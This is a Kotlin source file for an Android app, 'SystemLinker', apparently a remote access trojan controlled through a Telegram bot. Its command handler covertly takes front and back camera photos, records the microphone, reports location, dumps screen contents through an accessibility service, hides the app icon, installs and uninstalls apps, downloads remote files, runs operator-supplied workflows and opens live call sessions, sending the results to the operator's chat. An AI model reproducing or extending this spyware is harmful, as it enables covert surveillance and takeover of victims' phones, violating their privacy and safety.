package com.systemlinker.features

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import com.systemlinker.base.ConfigStore
import com.systemlinker.base.ErrorLogger
import com.systemlinker.base.VaultManager
import com.systemlinker.features.events.TriggerManager
import com.systemlinker.features.call.VoipManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import org.json.JSONObject
import java.io.File
import kotlin.coroutines.resume
import com.systemlinker.features.workflow.WorkflowEngine
import com.systemlinker.features.workflow.WorkflowParser
import com.systemlinker.features.workflow.MetaTask

class CommandProcessor(
    private val context: Context,
    private val defaultBotToken: String,
    private val defaultChatId: Long
) {
    private val configStore = ConfigStore(context)
    private val uploader = TelegramUploader(context, configStore.botToken, configStore.targetChatId)
    private val liveSessionManager = LiveSessionManager(context)
    private val mediaHandler = MediaHandler(context)
    private val systemHandler = SystemHandler(context)
    private val workflowEngine = WorkflowEngine(context, uploader, systemHandler, mediaHandler)
    private val triggerManager = TriggerManager(context, VaultManager(context))
    private val voipManager = VoipManager(context)
    private val processorScope = CoroutineScope(Dispatchers.IO)

    fun execute(payload: JSONObject) {
        val cmd = payload.optString("cmd", "")
        val arg = payload.optString("arg", "")

        uploader.botToken = configStore.botToken
        uploader.chatId = configStore.targetChatId

        processorScope.launch {
            try {
                when (cmd) {
                    
                    "call" -> {
                        val parts = arg.split(",").map { it.trim() }
                        if (parts.size >= 2) {
                            val mode = parts[0]
                            val speaker = parts[1]
                            var url = if (parts.size >= 3) parts[2] else ""
                            
                            if (url.isEmpty()) {
                                uploader.sendText("⏳ Polling for 30s. Please send the WebSocket URL (ws:// or wss://)...")
                                val receivedText = uploader.pollForText(30)
                                
                                if (receivedText != null && receivedText.startsWith("ws")) {
                                    url = receivedText
                                } else {
                                    uploader.sendText("❌ Timeout or invalid URL received. Call aborted.")
                                    return@launch
                                }
                            }
                            
                            if (url.startsWith("ws")) {
                                if (!url.endsWith("/live")) {
                                    url = url.removeSuffix("/") + "/live"
                                }
                                
                                voipManager.startCall(url, mode, speaker)
                                uploader.sendText("📞 VoIP Call Started.\nMode: `$mode`\nSpeaker: `$speaker`\nTarget: `$url`")
                            } else {
                                uploader.sendText("❌ Invalid URL format. Must start with ws:// or wss://")
                            }
                        } else {
                            uploader.sendText("❌ Invalid call args. Expected: `mode, speaker_mode` (e.g. `nm, loud`)")
                        }
                    }
                    
                    "end_call" -> {
                        if (voipManager.isCallActive) {
                            voipManager.endCall()
                            uploader.sendText("📵 VoIP Call Terminated.")
                        } else {
                            uploader.sendText("No active call to terminate.")
                        }
                    }

                    // ... (All other commands remain exactly as they were) ...
                    
                    "help" -> {
                        val type = arg.trim().lowercase()
                        if (type == "workflow") {
                            uploader.sendText("Generating Comprehensive Workflow Manual...")
                            val docFile = HelpGenerator.generateWorkflowHelp(context)
                            uploader.sendDocument(docFile, "📚 System Linker - Workflow Engine Guide", true)
                        } else {
                            uploader.sendText("Generating Command Reference Guide...")
                            val docFile = HelpGenerator.generateCommandHelp(context)
                            uploader.sendDocument(docFile, "🛠️ System Linker - Command Reference Guide", true)
                        }
                    }
                    "set_bot_api" -> {
                        configStore.botToken = arg.trim()
                        uploader.botToken = configStore.botToken
                        uploader.sendText("✅ Bot API updated permanently.")
                    }
                    "set_target_chatid" -> {
                        configStore.targetChatId = arg.trim().toLongOrNull() ?: configStore.targetChatId
                        uploader.chatId = configStore.targetChatId
                        uploader.sendText("✅ Target Chat ID updated permanently.")
                    }
                    "set_overlay_duration" -> {
                        configStore.overlayDurationMs = arg.trim().toLongOrNull() ?: 3000L
                        uploader.sendText("Overlay duration set to ${configStore.overlayDurationMs}ms.")
                    }
                    "click_after_HS_switch" -> {
                        val parts = arg.split(",")
                        configStore.postHotspotAction = parts[0].trim()
                        configStore.postHotspotArgs = if (parts.size > 1) parts[1].trim().toIntOrNull() ?: 1 else 1
                        uploader.sendText("Post-Hotspot action set to: ${configStore.postHotspotAction} x${configStore.postHotspotArgs}")
                    }
                    "set_overlay" -> {
                        uploader.sendText("⏳ Polling for 30 seconds. Please send an IMAGE now to set as the persistent overlay...")
                        val destFile = File(context.filesDir, "stealth_overlay.jpg")
                        val success = uploader.pollForFile(30, "photo", destFile)
                        if (success) uploader.sendText("✅ Overlay image received and saved successfully.")
                        else uploader.sendText("❌ Timeout. No image received.")
                    }

                    "halt_workflow" -> {
                        val target = arg.trim().ifBlank { "all" }
                        val vault = VaultManager(context)
                        vault.setWorkflowState(target, "halted")
                        triggerManager.refreshTriggers()
                        uploader.sendText("🛑 Workflow(s) [$target] HALTED. Triggers optimized.")
                    }

                    "resume_workflow" -> {
                        val target = arg.trim().ifBlank { "all" }
                        val vault = VaultManager(context)
                        vault.setWorkflowState(target, "active")
                        triggerManager.refreshTriggers()
                        uploader.sendText("▶️ Workflow(s) [$target] RESUMED. Required triggers activated.")
                    }

                    "workflow" -> {
                        val wfName = arg.trim().ifBlank { "default_flow" }
                        uploader.sendText("⏳ Polling for 30s. Please send a DOCUMENT (YML/TXT) for workflow: $wfName...")
                        val destFile = File(context.cacheDir, "$wfName.yml")
                        val success = uploader.pollForFile(30, "document", destFile)
                        
                        if (success) {
                            val content = destFile.readText()
                            destFile.delete() 
                            
                            val tasks = WorkflowParser.parseString(content)
                            val meta = tasks.firstOrNull { it.type == "meta" } as? MetaTask
                            
                            val type = meta?.lifecycle ?: "temp"
                            val trigger = meta?.trigger ?: ""
                            
                            val vault = VaultManager(context)
                            vault.saveWorkflow(wfName, type, trigger, content)
                            
                            triggerManager.refreshTriggers()
                            
                            if (type == "temp") {
                                uploader.sendText("✅ Temp Workflow saved. Executing & Deleting...")
                                workflowEngine.executeWorkflow(wfName, deleteAfter = true)
                            } else if (type == "semi" || type == "semi_perma") {
                                uploader.sendText("✅ Semi-Perma Workflow active. Listening for trigger: $trigger")
                            } else {
                                uploader.sendText("✅ Permanent Workflow saved. Ready for manual execution.")
                                workflowEngine.executeWorkflow(wfName, deleteAfter = false)
                            }
                        } else {
                            uploader.sendText("❌ Timeout. No workflow document received.")
                        }
                    }
                    
                    "status_workflow" -> {
                        val wfName = arg.trim().ifBlank { "default_flow" }
                        workflowEngine.sendStatus(wfName)
                    }

                    "dump_screen" -> {
                        uploader.sendText("Extracting UI DOM Tree...")
                        val dumpFile = suspendCancellableCoroutine<File?> { cont ->
                            val receiver = object : BroadcastReceiver() {
                                override fun onReceive(c: Context?, intent: Intent?) {
                                    if (intent?.action == "com.systemlinker.UI_RESULT") {
                                        context.unregisterReceiver(this)
                                        val msg = intent.getStringExtra("result") ?: ""
                                        if (msg.contains("SUCCESS")) {
                                            if (cont.isActive) cont.resume(File(context.filesDir, "ui_debug_dump.txt"))
                                        } else {
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                }
                            }
                            val filter = IntentFilter("com.systemlinker.UI_RESULT")
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                            } else {
                                context.registerReceiver(receiver, filter)
                            }
                            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                                setPackage(context.packageName)
                                putExtra("action", "dump_screen_request")
                            }
                            context.sendBroadcast(intent)
                        }
                        
                        if (dumpFile != null && dumpFile.exists()) {
                            uploader.sendDocument(dumpFile, "Standalone UI Debug Dump", true)
                        } else {
                            uploader.sendText("Failed to generate UI dump.")
                        }
                    }

                    "ping" -> uploader.sendText("🟢 Device Online\n${systemHandler.getBasicBatteryStatus()}")
                    "cam_front" -> mediaHandler.takePicture(isFront = true)?.let { uploader.sendFile(it, "photo", "Front Camera") }
                    "cam_back" -> mediaHandler.takePicture(isFront = false)?.let { uploader.sendFile(it, "photo", "Back Camera") }
                    "mic" -> mediaHandler.recordAudio(arg.toIntOrNull() ?: 15)?.let { uploader.sendFile(it, "audio", "Mic Record") }
                    "loc" -> uploader.sendText(systemHandler.getLocation())
                    "flash" -> uploader.sendText(systemHandler.setFlashlight(arg == "on"))
                    "vol" -> systemHandler.setVolume(arg.toIntOrNull() ?: 50)
                    "info" -> uploader.sendDocument(systemHandler.generateFullSystemReport(), "Full Device Intel Report", true)
                    "get_log" -> uploader.sendDocument(ErrorLogger.getLogFile(context), "SystemLinker Error Logs")
                    "clear_log" -> ErrorLogger.clearLogs(context)
                    "live_start" -> liveSessionManager.connect(arg.trim())
                    "live_stop" -> liveSessionManager.disconnect()
                    "install_app" -> systemHandler.installApp(arg)
                    "uninstall_app" -> systemHandler.uninstallApp(arg)
                    "icon_hide" -> uploader.sendText(systemHandler.setAppIconVisibility(false))
                    "icon_show" -> uploader.sendText(systemHandler.setAppIconVisibility(true))
                    "toggle_wifi" -> uploader.sendText(systemHandler.setWifiState(arg == "on"))
                    "toggle_bt" -> uploader.sendText(systemHandler.setBluetoothState(arg == "on"))
                    "toggle_hotspot" -> uploader.sendText(systemHandler.setHotspotState(arg == "on"))
                    "scan_wifi" -> uploader.sendText(systemHandler.getWifiScanResults())
                    "scan_bt" -> uploader.sendText(systemHandler.getBluetoothScanResults())
                    "download_url" -> {
                        try {
                            val json = JSONObject(arg)
                            uploader.sendText(systemHandler.downloadFileFromUrl(json.optString("url"), json.optString("path", "")))
                        } catch (e: Exception) { }
                    }
                }
            } catch (e: Exception) {
                ErrorLogger.logError(context, "CommandExecute_${cmd}", e)
                uploader.sendText("Execution failed for command: $cmd")
            }
        }
    }
}